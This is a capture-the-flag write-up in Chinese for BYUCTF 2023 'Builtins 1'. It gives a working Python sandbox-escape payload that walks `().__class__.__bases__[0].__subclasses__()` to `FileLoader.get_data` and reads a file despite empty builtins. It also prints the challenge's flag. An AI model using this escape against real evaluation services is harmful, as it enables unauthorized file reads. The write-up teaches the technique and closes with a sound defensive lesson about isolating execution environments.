# BYUCTF 2023 - Builtins 1

## 题目简述

服务在 Python 3.12.0a6 环境中用空的 `__builtins__` 执行表达式，flag 位于当前目录的 `flag.txt`。虽然常用内置函数不可见，但现存对象仍能通向 Python 的类型体系和已加载类。

## 解题过程

从空元组实例向上取得 `object`，再枚举其直接子类：

```python
().__class__.__bases__[0].__subclasses__()
```

官方容器中索引 `124` 对应 `_frozen_importlib_external.FileLoader`。它的 `get_data` 方法能直接读取文件，不依赖表达式全局命名空间中的 `open`：

```python
().__class__.__bases__[0].__subclasses__()[124].get_data('.', 'flag.txt')
```

返回字节串中包含：

```text
byuctf{no_builtins?_no_problem}
```

子类索引依赖 Python 版本与加载顺序；本题明确固定镜像版本，所以官方索引可复现。自行调试时应先枚举类名，再确定索引。

## 方法总结

清空 `__builtins__` 不等于清空运行时能力。只要攻击者能创建普通对象，就可能沿 `__class__ -> __bases__ -> __subclasses__` 找到文件加载器、导入器或进程相关类。防御重点应是隔离执行环境，而不是只删名称。
